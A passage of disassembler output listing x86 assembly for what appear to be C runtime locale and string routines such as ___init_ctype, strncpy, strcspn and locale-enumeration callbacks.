		lea	edi, [esi+1]
		mov	cl, [edi]
		mov	[esi], cl
		mov	esi, edi
		cmp	byte ptr [esi],	0
		jnz	short loc_1008E8A
		jmp	short loc_1008E7C
; ---------------------------------------------------------------------------

loc_1008E9A:				; CODE XREF: ___init_monetary+5Dj
		push	0Ch
		pop	ecx
		mov	esi, offset ___lconv_c
		mov	edi, ebx
		rep movsd

loc_1008EA6:				; CODE XREF: ___init_monetary+19Aj
		mov	eax, ___lconv
		mov	eax, [eax]
		mov	[ebx], eax
		mov	eax, ___lconv
		mov	eax, [eax+4]
		mov	[ebx+4], eax
		mov	eax, ___lconv
		mov	eax, [eax+8]
		mov	[ebx+8], eax
		push	___lconv_intl
		mov	___lconv, ebx
		call	___free_lconv_mon
		push	___lconv_intl	; Memory
		call	_free
		mov	___lconv_intl, ebx

loc_1008EE7:				; CODE XREF: ___init_monetary+3Dj
		pop	ecx
		pop	ecx
		xor	eax, eax

loc_1008EEB:				; CODE XREF: ___init_monetary+179j
		pop	edi
		pop	esi
		pop	ebx
		retn
___init_monetary endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___init_ctype	proc near		; DATA XREF: .data:0100E1F8o

var_30		= dword	ptr -30h
lpMultiByteStr	= dword	ptr -20h
var_1C		= dword	ptr -1Ch
CPInfo		= _cpinfo ptr -18h
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		mov	eax, ___security_cookie
		push	ebx
		xor	ebx, ebx
		cmp	dword_10106FC, ebx
		push	esi
		mov	[ebp+var_4], eax
		push	edi
		jz	loc_100907C
		cmp	___lc_codepage,	ebx
		jnz	short loc_1008F40
		movzx	eax, word_1010754
		push	offset ___lc_codepage ;	int
		push	1004h		; LCType
		push	eax		; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 10h
		test	eax, eax
		jnz	loc_1009077

loc_1008F40:				; CODE XREF: ___init_ctype+27j
		push	202h		; Size
		call	_malloc
		mov	[ebp+var_1C], eax
		mov	[esp+30h+var_30], 101h
		call	_malloc
		cmp	[ebp+var_1C], ebx
		mov	edi, eax
		pop	ecx
		mov	[ebp+lpMultiByteStr], edi
		jz	loc_100906C
		cmp	edi, ebx
		jz	loc_1009063
		xor	eax, eax
		mov	esi, 100h

loc_1008F77:				; CODE XREF: ___init_ctype+89j
		mov	[eax+edi], al
		inc	eax
		cmp	eax, esi
		jl	short loc_1008F77
		lea	eax, [ebp+CPInfo]
		push	eax		; lpCPInfo
		push	___lc_codepage	; CodePage
		call	ds:__imp__GetCPInfo@8 ;	GetCPInfo(x,x)
		test	eax, eax
		jz	loc_1009063
		cmp	[ebp+CPInfo.MaxCharSize], 5
		ja	loc_1009063
		movzx	eax, word ptr [ebp+CPInfo.MaxCharSize]
		cmp	eax, 1
		mov	___mb_cur_max, eax
		jle	short loc_1008FD8
		cmp	[ebp+CPInfo.LeadByte], bl
		jz	short loc_1008FD8
		lea	eax, [ebp+CPInfo.LeadByte+1]

loc_1008FB7:				; CODE XREF: ___init_ctype+E2j
		mov	dl, [eax]
		cmp	dl, bl
		jz	short loc_1008FD8
		movzx	ecx, byte ptr [eax-1]
		movzx	edx, dl
		jmp	short loc_1008FCD
; ---------------------------------------------------------------------------

loc_1008FC6:				; CODE XREF: ___init_ctype+DBj
		mov	[ecx+edi], bl
		movzx	edx, byte ptr [eax]
		inc	ecx

loc_1008FCD:				; CODE XREF: ___init_ctype+D0j
		cmp	ecx, edx
		jle	short loc_1008FC6
		inc	eax
		inc	eax
		cmp	[eax-1], bl
		jnz	short loc_1008FB7

loc_1008FD8:				; CODE XREF: ___init_ctype+B9j
					; ___init_ctype+BEj ...
		mov	edi, [ebp+var_1C]
		push	ebx		; int
		push	ebx		; Locale
		push	ebx		; CodePage
		add	edi, 2
		push	edi		; lpCharType
		push	esi		; cchSrc
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		push	1		; dwInfoType
		call	___crtGetStringTypeA
		add	esp, 1Ch
		test	eax, eax
		jz	short loc_1009060
		mov	esi, [ebp+var_1C]
		mov	[esi], bx
		cmp	___mb_cur_max, 1
		jle	short loc_1009039
		cmp	[ebp+CPInfo.LeadByte], bl
		jz	short loc_1009039
		lea	eax, [ebp+CPInfo.LeadByte+1]

loc_100900B:				; CODE XREF: ___init_ctype+143j
		mov	dl, [eax]
		cmp	dl, bl
		jz	short loc_1009039
		movzx	ecx, byte ptr [eax-1]
		movzx	edx, dl
		cmp	ecx, edx
		jg	short loc_1009032
		lea	edx, [esi+ecx*2+2]

loc_1009020:				; CODE XREF: ___init_ctype+139j
		mov	word ptr [edx],	8000h
		movzx	esi, byte ptr [eax]
		inc	ecx
		inc	edx
		inc	edx
		cmp	ecx, esi
		jle	short loc_1009020
		mov	esi, [ebp+var_1C]

loc_1009032:				; CODE XREF: ___init_ctype+126j
		inc	eax
		inc	eax
		cmp	[eax-1], bl
		jnz	short loc_100900B

loc_1009039:				; CODE XREF: ___init_ctype+10Dj
					; ___init_ctype+112j ...
		mov	eax, ___ctype1
		cmp	eax, ebx
		mov	__pctype, edi
		jz	short loc_100904F
		push	eax		; Memory
		call	_free
		pop	ecx

loc_100904F:				; CODE XREF: ___init_ctype+152j
		push	[ebp+lpMultiByteStr] ; Memory
		mov	___ctype1, esi
		call	_free
		pop	ecx
		jmp	short loc_100909C
; ---------------------------------------------------------------------------

loc_1009060:				; CODE XREF: ___init_ctype+FEj
		mov	edi, [ebp+lpMultiByteStr]

loc_1009063:				; CODE XREF: ___init_ctype+76j
					; ___init_ctype+9Dj ...
		push	[ebp+var_1C]	; Memory
		call	_free
		pop	ecx

loc_100906C:				; CODE XREF: ___init_ctype+6Ej
		cmp	edi, ebx
		jz	short loc_1009077
		push	edi		; Memory
		call	_free
		pop	ecx

loc_1009077:				; CODE XREF: ___init_ctype+46j
					; ___init_ctype+17Aj
		xor	eax, eax
		inc	eax
		jmp	short loc_100909E
; ---------------------------------------------------------------------------

loc_100907C:				; CODE XREF: ___init_ctype+1Bj
		mov	eax, ___ctype1
		cmp	eax, ebx
		mov	__pctype, offset word_100239A
		jz	short loc_1009096
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1009096:				; CODE XREF: ___init_ctype+199j
		mov	___ctype1, ebx

loc_100909C:				; CODE XREF: ___init_ctype+16Aj
		xor	eax, eax

loc_100909E:				; CODE XREF: ___init_ctype+186j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
___init_ctype	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


___init_collate	proc near		; CODE XREF: sub_1006C05:loc_1006E1Dp
					; DATA XREF: .data:off_100E1E0o ...
		xor	eax, eax
		retn
___init_collate	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; size_t __cdecl strcspn(const char *Str, const	char *Control)
_strcspn	proc near		; CODE XREF: ___lc_strtolc+B9p
					; _setlocale+10Ep

var_24		= dword	ptr -24h
Str		= dword	ptr  8
Control		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	esi
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		mov	edx, [ebp+Control]
		lea	ecx, [ecx+0]

loc_10090D4:				; CODE XREF: _strcspn+1Fj
		mov	al, [edx]
		or	al, al
		jz	short loc_10090E1
		inc	edx
		bts	[esp+24h+var_24], eax
		jmp	short loc_10090D4
; ---------------------------------------------------------------------------

loc_10090E1:				; CODE XREF: _strcspn+18j
		mov	esi, [ebp+Str]
		or	ecx, 0FFFFFFFFh
		nop

loc_10090E8:				; CODE XREF: _strcspn+34j
		inc	ecx
		mov	al, [esi]
		or	al, al
		jz	short loc_10090F6
		inc	esi
		bt	[esp+24h+var_24], eax
		jnb	short loc_10090E8

loc_10090F6:				; CODE XREF: _strcspn+2Dj
		mov	eax, ecx
		add	esp, 20h
		pop	esi
		leave
		retn
_strcspn	endp

; ---------------------------------------------------------------------------
		db 12h dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; char *__cdecl	strncpy(char *Dest, const char *Source,	size_t Count)
_strncpy	proc near		; CODE XREF: ___lc_strtolc:loc_10068C6p
					; _setlocale+136p ...

Dest		= dword	ptr  4
Source		= dword	ptr  8
Count		= dword	ptr  0Ch

		mov	ecx, [esp+Count]
		push	edi
		test	ecx, ecx
		jz	short loc_1009193
		push	esi
		push	ebx
		mov	ebx, ecx
		mov	esi, [esp+0Ch+Source]
		test	esi, 3
		mov	edi, [esp+0Ch+Dest]
		jnz	short loc_1009134
		shr	ecx, 2
		jnz	short loc_10091A1
		jmp	short loc_1009155
; ---------------------------------------------------------------------------

loc_1009134:				; CODE XREF: _strncpy+1Bj _strncpy+37j
		mov	al, [esi]
		inc	esi
		mov	[edi], al
		inc	edi
		dec	ecx
		jz	short loc_1009162
		test	al, al
		jz	short loc_100916A
		test	esi, 3
		jnz	short loc_1009134
		mov	ebx, ecx
		shr	ecx, 2
		jnz	short loc_10091A1

loc_1009150:				; CODE XREF: _strncpy+8Fj
		and	ebx, 3
		jz	short loc_1009162

loc_1009155:				; CODE XREF: _strncpy+22j _strncpy+50j
		mov	al, [esi]
		inc	esi
		mov	[edi], al
		inc	edi
		test	al, al
		jz	short loc_100918E
		dec	ebx
		jnz	short loc_1009155

loc_1009162:				; CODE XREF: _strncpy+2Bj _strncpy+43j
		mov	eax, [esp+0Ch+Dest]
		pop	ebx
		pop	esi
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_100916A:				; CODE XREF: _strncpy+2Fj
		test	edi, 3
		jz	short loc_1009184

loc_1009172:				; CODE XREF: _strncpy+72j
		mov	[edi], al
		inc	edi
		dec	ecx
		jz	loc_1009206
		test	edi, 3
		jnz	short loc_1009172

loc_1009184:				; CODE XREF: _strncpy+60j
		mov	ebx, ecx
		shr	ecx, 2
		jnz	short loc_10091F7

loc_100918B:				; CODE XREF: _strncpy+7Fj _strncpy+F4j
		mov	[edi], al
		inc	edi

loc_100918E:				; CODE XREF: _strncpy+4Dj
		dec	ebx
		jnz	short loc_100918B
		pop	ebx
		pop	esi

loc_1009193:				; CODE XREF: _strncpy+7j
		mov	eax, [esp+4+Dest]
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_1009199:				; CODE XREF: _strncpy+A9j _strncpy+C1j
		mov	[edi], edx
		add	edi, 4
		dec	ecx
		jz	short loc_1009150

loc_10091A1:				; CODE XREF: _strncpy+20j _strncpy+3Ej
		mov	edx, 7EFEFEFFh
		mov	eax, [esi]
		add	edx, eax
		xor	eax, 0FFFFFFFFh
		xor	eax, edx
		mov	edx, [esi]
		add	esi, 4
		test	eax, 81010100h
		jz	short loc_1009199
		test	dl, dl
		jz	short loc_10091EB
		test	dh, dh
		jz	short loc_10091E1
		test	edx, 0FF0000h
		jz	short loc_10091D7
		test	edx, 0FF000000h
		jnz	short loc_1009199
		mov	[edi], edx
		jmp	short loc_10091EF
; ---------------------------------------------------------------------------

loc_10091D7:				; CODE XREF: _strncpy+B9j
		and	edx, 0FFFFh
		mov	[edi], edx
		jmp	short loc_10091EF
; ---------------------------------------------------------------------------

loc_10091E1:				; CODE XREF: _strncpy+B1j
		and	edx, 0FFh
		mov	[edi], edx
		jmp	short loc_10091EF
; ---------------------------------------------------------------------------

loc_10091EB:				; CODE XREF: _strncpy+ADj
		xor	edx, edx
		mov	[edi], edx

loc_10091EF:				; CODE XREF: _strncpy+C5j _strncpy+CFj ...
		add	edi, 4
		xor	eax, eax
		dec	ecx
		jz	short loc_1009201

loc_10091F7:				; CODE XREF: _strncpy+79j
		xor	eax, eax

loc_10091F9:				; CODE XREF: _strncpy+EFj
		mov	[edi], eax
		add	edi, 4
		dec	ecx
		jnz	short loc_10091F9

loc_1009201:				; CODE XREF: _strncpy+E5j
		and	ebx, 3
		jnz	short loc_100918B

loc_1009206:				; CODE XREF: _strncpy+66j
		mov	eax, [esp+0Ch+Dest]
		pop	ebx
		pop	esi
		pop	edi
		retn
_strncpy	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)
; [00000062 BYTES: COLLAPSED FUNCTION _TranslateName. PRESS KEYPAD "+" TO EXPAND]
		db 5 dup(0CCh)
; [0000001A BYTES: COLLAPSED FUNCTION _GetLcidFromDefault. PRESS KEYPAD	"+" TO EXPAND]
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_1009299(char *Str)
sub_1009299	proc near		; CODE XREF: ___get_qualified_locale+FCp

var_C		= byte ptr -0Ch
var_4		= dword	ptr -4
Str		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		mov	eax, [ebp+Str]
		test	eax, eax
		push	esi
		push	edi
		jz	short loc_10092E1
		cmp	byte ptr [eax],	0
		jz	short loc_10092E1
		push	4
		mov	edi, offset aAcp ; "ACP"
		mov	esi, eax
		pop	ecx
		xor	edx, edx
		repe cmpsb
		jz	short loc_10092E1
		push	4
		mov	edi, offset aOcp ; "OCP"
		mov	esi, eax
		pop	ecx
		xor	edx, edx
		repe cmpsb
		jnz	short loc_10092FF
		push	8
		lea	eax, [ebp+var_C]
		push	eax
		push	0Bh
		jmp	short loc_10092EC
; ---------------------------------------------------------------------------

loc_10092E1:				; CODE XREF: sub_1009299+17j
					; sub_1009299+1Cj ...
		push	8
		lea	eax, [ebp+var_C]
		push	eax
		push	1004h

loc_10092EC:				; CODE XREF: sub_1009299+46j
		push	dword_1010728
		call	dword_1010740
		test	eax, eax
		jz	short loc_1009306
		lea	eax, [ebp+var_C]

loc_10092FF:				; CODE XREF: sub_1009299+3Cj
		push	eax		; Str
		call	_atol
		pop	ecx

loc_1009306:				; CODE XREF: sub_1009299+61j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
sub_1009299	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)
; [00000024 BYTES: COLLAPSED FUNCTION _TestDefaultCountry. PRESS KEYPAD	"+" TO EXPAND]
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_1009340(LCID Locale, LCTYPE	LCType,	LPSTR Dest, int	cchData)
sub_1009340	proc near		; DATA XREF: ___get_qualified_locale:loc_1009A15o

Locale		= dword	ptr  8
LCType		= dword	ptr  0Ch
Dest		= dword	ptr  10h
cchData		= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		push	1Ah
		xor	esi, esi
		pop	edi

loc_100934D:				; CODE XREF: sub_1009340+34j
		mov	ebx, [ebp+cchData]
		lea	eax, [edi+esi]
		cdq
		sub	eax, edx
		sar	eax, 1
		mov	ecx, eax
		imul	ecx, 2Ch
		mov	ecx, dword ptr ds:___rgLocInfo[ecx]
		cmp	[ebp+Locale], ecx
		jz	short loc_100938D
		jnb	short loc_100936F
		lea	edi, [eax-1]
		jmp	short loc_1009372
; ---------------------------------------------------------------------------

loc_100936F:				; CODE XREF: sub_1009340+28j
		lea	esi, [eax+1]

loc_1009372:				; CODE XREF: sub_1009340+2Dj
		cmp	esi, edi
		jle	short loc_100934D

loc_1009376:				; CODE XREF: sub_1009340+6Ej
					; sub_1009340+B8j ...
		push	ebx		; cchData
		push	[ebp+Dest]	; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoA@16 ; GetLocaleInfoA(x,x,x,x)

loc_1009386:				; CODE XREF: sub_1009340+E0j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	10h
; ---------------------------------------------------------------------------

loc_100938D:				; CODE XREF: sub_1009340+26j
		mov	ecx, [ebp+LCType]
		dec	ecx
		jz	short loc_10093EE
		dec	ecx
		dec	ecx
		jz	short loc_10093E4
		sub	ecx, 4
		jz	short loc_10093DA
		sub	ecx, 4
		jz	short loc_10093D0
		sub	ecx, 0FF6h
		jz	short loc_10093C5
		dec	ecx
		jz	short loc_10093BA
		dec	ecx
		dec	ecx
		jnz	short loc_1009376
		imul	eax, 2Ch
		add	eax, offset a1252 ; "1252"
		jmp	short loc_10093F6
; ---------------------------------------------------------------------------

loc_10093BA:				; CODE XREF: sub_1009340+6Aj
		imul	eax, 2Ch
		mov	eax, ds:off_10027BC[eax]
		jmp	short loc_10093F6
; ---------------------------------------------------------------------------

loc_10093C5:				; CODE XREF: sub_1009340+67j
		imul	eax, 2Ch
		mov	eax, ds:off_10027B4[eax]
		jmp	short loc_10093F6
; ---------------------------------------------------------------------------

loc_10093D0:				; CODE XREF: sub_1009340+5Fj
		imul	eax, 2Ch
		add	eax, offset dword_10027C4
		jmp	short loc_10093F6
; ---------------------------------------------------------------------------

loc_10093DA:				; CODE XREF: sub_1009340+5Aj
		imul	eax, 2Ch
		add	eax, offset dword_10027C0
		jmp	short loc_10093F6
; ---------------------------------------------------------------------------

loc_10093E4:				; CODE XREF: sub_1009340+55j
		imul	eax, 2Ch
		add	eax, offset dword_10027B8
		jmp	short loc_10093F6
; ---------------------------------------------------------------------------

loc_10093EE:				; CODE XREF: sub_1009340+51j
		imul	eax, 2Ch
		add	eax, 10027ACh

loc_10093F6:				; CODE XREF: sub_1009340+78j
					; sub_1009340+83j ...
		test	eax, eax
		jz	loc_1009376
		cmp	ebx, 1
		jl	loc_1009376
		mov	esi, [ebp+Dest]
		lea	ecx, [ebx-1]
		push	ecx		; Count
		push	eax		; Source
		push	esi		; Dest
		call	_strncpy
		xor	eax, eax
		add	esp, 0Ch
		mov	byte ptr [esi+ebx-1], 0
		inc	eax
		jmp	loc_1009386
sub_1009340	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)
; [00000035 BYTES: COLLAPSED FUNCTION _LcidFromHexString. PRESS	KEYPAD "+" TO EXPAND]
		db 5 dup(0CCh)
; [0000001D BYTES: COLLAPSED FUNCTION _GetPrimaryLen. PRESS KEYPAD "+" TO EXPAND]
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall LocaleEnumProc(LPSTR)
LocaleEnumProc	proc near		; DATA XREF: sub_10098B1+1Bo

Str2		= byte ptr -7Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 7Ch
		mov	eax, ___security_cookie
		mov	edx, [ebp+arg_0]
		push	esi
		mov	[ebp+var_4], eax
		call	_LcidFromHexString
		mov	esi, eax
		push	78h
		lea	eax, [ebp+Str2]
		push	eax
		mov	eax, dword_1010730
		neg	eax
		sbb	eax, eax
		and	eax, 0FFFFF005h
		add	eax, 1002h
		push	eax
		push	esi
		call	dword_1010740
		test	eax, eax
		jnz	short loc_10094CF
		and	dword_1010720, eax
		inc	eax
		jmp	short loc_100950F
; ---------------------------------------------------------------------------

loc_10094CF:				; CODE XREF: LocaleEnumProc+3Ej
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	Str1		; Str1
		call	__stricmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1009502
		push	esi
		call	_TestDefaultCountry
		test	eax, eax
		pop	ecx
		jz	short loc_1009502
		or	dword_1010720, 4
		mov	dword_1010728, esi
		mov	Locale,	esi

loc_1009502:				; CODE XREF: LocaleEnumProc+5Cj
					; LocaleEnumProc+67j
		mov	eax, dword_1010720
		shr	eax, 2
		not	eax
		and	eax, 1

loc_100950F:				; CODE XREF: LocaleEnumProc+47j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn	4
LocaleEnumProc	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1009521	proc near		; CODE XREF: sub_100959B+1BDp
					; sub_100959B+203p ...

var_7C		= byte ptr -7Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 7Ch
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		push	78h
		lea	eax, [ebp+var_7C]
		push	eax
		mov	eax, [ebp+arg_0]
		and	eax, 3FFh
		push	1
		or	eax, 400h
		push	eax
		call	dword_1010740
		test	eax, eax
		jz	short loc_1009585
		lea	edx, [ebp+var_7C]
		call	_LcidFromHexString
		cmp	[ebp+arg_0], eax
		jz	short loc_1009589
		cmp	[ebp+arg_4], 0
		jz	short loc_1009589
		mov	edx, dword_101073C
		mov	eax, edx
		push	esi
		lea	esi, [eax+1]

loc_1009570:				; CODE XREF: sub_1009521+54j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1009570
		sub	eax, esi
		mov	esi, eax
		call	_GetPrimaryLen
		cmp	eax, esi
		pop	esi
		jnz	short loc_1009589

loc_1009585:				; CODE XREF: sub_1009521+2Ej
		xor	eax, eax
		jmp	short loc_100958C
; ---------------------------------------------------------------------------

loc_1009589:				; CODE XREF: sub_1009521+3Bj
					; sub_1009521+41j ...
		xor	eax, eax
		inc	eax

loc_100958C:				; CODE XREF: sub_1009521+66j
		mov	ecx, [ebp+var_4]
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
sub_1009521	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall sub_100959B(LPSTR)
sub_100959B	proc near		; DATA XREF: sub_10098F3+6Bo

Str2		= byte ptr -7Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 7Ch
		mov	eax, ___security_cookie
		mov	edx, [ebp+arg_0]
		push	esi
		mov	[ebp+var_4], eax
		call	_LcidFromHexString
		mov	esi, eax
		push	78h
		lea	eax, [ebp+Str2]
		push	eax
		mov	eax, dword_1010730
		neg	eax
		sbb	eax, eax
		and	eax, 0FFFFF005h
		add	eax, 1002h
		push	eax
		push	esi
		call	dword_1010740
		test	eax, eax
		jnz	short loc_10095E7
		and	dword_1010720, eax
		inc	eax
		jmp	loc_10097CD
; ---------------------------------------------------------------------------

loc_10095E7:				; CODE XREF: sub_100959B+3Ej
		push	ebx
		push	edi
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	Str1		; Str1
		call	__stricmp
		test	eax, eax
		pop	ecx
		pop	ecx
		mov	ebx, 0FFFFF002h
		mov	edi, 1001h
		jnz	loc_10096CD
		push	78h
		lea	eax, [ebp+Str2]
		push	eax
		mov	eax, dword_101072C
		neg	eax
		sbb	eax, eax
		and	eax, ebx
		add	eax, edi
		push	eax
		push	esi
		call	dword_1010740
		test	eax, eax
		jz	loc_1009701
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	dword_101073C	; Str1
		call	__stricmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1009655
		or	word ptr dword_1010720,	304h
		mov	Locale,	esi
		jmp	short loc_10096C7
; ---------------------------------------------------------------------------

loc_1009655:				; CODE XREF: sub_100959B+A7j
		test	byte ptr dword_1010720,	2
		jnz	short loc_10096CD
		mov	eax, MaxCount
		test	eax, eax
		jz	short loc_10096AC
		push	eax		; MaxCount
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	dword_101073C	; Str1
		call	__strnicmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10096AC
		mov	eax, dword_101073C
		or	dword_1010720, 2
		mov	dword_1010728, esi
		lea	ecx, [eax+1]

loc_1009693:				; CODE XREF: sub_100959B+FDj
		mov	dl, [eax]
		inc	eax
		test	dl, dl
		jnz	short loc_1009693
		sub	eax, ecx
		cmp	eax, MaxCount
		jnz	short loc_10096CD
		mov	Locale,	esi
		jmp	short loc_10096CD
; ---------------------------------------------------------------------------

loc_10096AC:				; CODE XREF: sub_100959B+CAj
					; sub_100959B+E1j
		test	byte ptr dword_1010720,	1
		jnz	short loc_10096CD
		push	esi
		call	_TestDefaultCountry
		test	eax, eax
		pop	ecx
		jz	short loc_10096CD
		or	dword_1010720, 1

loc_10096C7:				; CODE XREF: sub_100959B+B8j
		mov	dword_1010728, esi

loc_10096CD:				; CODE XREF: sub_100959B+6Bj
					; sub_100959B+C1j ...
		mov	ecx, dword_1010720
		mov	eax, 300h
		and	ecx, eax
		cmp	ecx, eax
		jz	loc_10097BE
		push	78h
		lea	eax, [ebp+Str2]
		push	eax
		mov	eax, dword_101072C
		neg	eax
		sbb	eax, eax
		and	eax, ebx
		add	eax, edi
		push	eax
		push	esi
		call	dword_1010740
		test	eax, eax
		jnz	short loc_1009710

loc_1009701:				; CODE XREF: sub_100959B+8Ej
		and	dword_1010720, 0
		xor	eax, eax
		inc	eax
		jmp	loc_10097CB
; ---------------------------------------------------------------------------

loc_1009710:				; CODE XREF: sub_100959B+164j
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	dword_101073C	; Str1
		call	__stricmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1009772
		or	byte ptr dword_1010720+1, 2
		xor	ebx, ebx
		cmp	dword_101072C, ebx
		jnz	short loc_1009763
		mov	ecx, MaxCount
		cmp	ecx, ebx
		jz	short loc_1009763
		mov	eax, dword_101073C
		lea	edi, [eax+1]

loc_1009748:				; CODE XREF: sub_100959B+1B2j
		mov	dl, [eax]
		inc	eax
		test	dl, dl
		jnz	short loc_1009748
		sub	eax, edi
		cmp	eax, ecx
		jnz	short loc_1009763
		push	1
		push	esi
		call	sub_1009521
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_10097BE

loc_1009763:				; CODE XREF: sub_100959B+199j
					; sub_100959B+1A3j ...
		or	byte ptr dword_1010720+1, 1
		cmp	Locale,	ebx
		jmp	short loc_10097B6
; ---------------------------------------------------------------------------

loc_1009772:				; CODE XREF: sub_100959B+188j
		xor	edi, edi
		cmp	dword_101072C, edi
		jnz	short loc_10097BE
		mov	eax, MaxCount
		cmp	eax, edi
		jz	short loc_10097BE
		push	eax		; MaxCount
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	dword_101073C	; Str1
		call	__strnicmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10097BE
		push	edi
		push	esi
		call	sub_1009521
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_10097BE
		or	byte ptr dword_1010720+1, 1
		cmp	Locale,	edi

loc_10097B6:				; CODE XREF: sub_100959B+1D5j
		jnz	short loc_10097BE
		mov	Locale,	esi

loc_10097BE:				; CODE XREF: sub_100959B+141j
					; sub_100959B+1C6j ...
		mov	eax, dword_1010720
		shr	eax, 2
		not	eax
		and	eax, 1

loc_10097CB:				; CODE XREF: sub_100959B+170j
		pop	edi
		pop	ebx

loc_10097CD:				; CODE XREF: sub_100959B+47j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn	4
sub_100959B	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; BOOL __stdcall sub_10097DF(LPSTR)
sub_10097DF	proc near		; DATA XREF: sub_100998C+41o

Str2		= byte ptr -7Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 7Ch
		mov	eax, ___security_cookie
		mov	edx, [ebp+arg_0]
		push	esi
		mov	[ebp+var_4], eax
		call	_LcidFromHexString
		mov	esi, eax
		push	78h
		lea	eax, [ebp+Str2]
		push	eax
		mov	eax, dword_101072C
		neg	eax
		sbb	eax, eax
		and	eax, 0FFFFF002h
		add	eax, 1001h
		push	eax
		push	esi
		call	dword_1010740
		test	eax, eax
		jnz	short loc_1009828
		and	dword_1010720, eax
		inc	eax
		jmp	short loc_100989F
; ---------------------------------------------------------------------------

loc_1009828:				; CODE XREF: sub_10097DF+3Ej
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	dword_101073C	; Str1
		call	__stricmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_1009849
		cmp	dword_101072C, eax
		jnz	short loc_100987F
		push	1
		jmp	short loc_1009873
; ---------------------------------------------------------------------------

loc_1009849:				; CODE XREF: sub_10097DF+5Cj
		cmp	dword_101072C, 0
		jnz	short loc_1009892
		mov	eax, MaxCount
		test	eax, eax
		jz	short loc_1009892
		push	eax		; MaxCount
		lea	eax, [ebp+Str2]
		push	eax		; Str2
		push	dword_101073C	; Str1
		call	__strnicmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_1009892
		push	eax

loc_1009873:				; CODE XREF: sub_10097DF+68j
		push	esi
		call	sub_1009521
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_1009892

loc_100987F:				; CODE XREF: sub_10097DF+64j
		or	dword_1010720, 4
		mov	dword_1010728, esi
		mov	Locale,	esi

loc_1009892:				; CODE XREF: sub_10097DF+71j
					; sub_10097DF+7Aj ...
		mov	eax, dword_1010720
		shr	eax, 2
		not	eax
		and	eax, 1

loc_100989F:				; CODE XREF: sub_10097DF+47j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn	4
sub_10097DF	endp

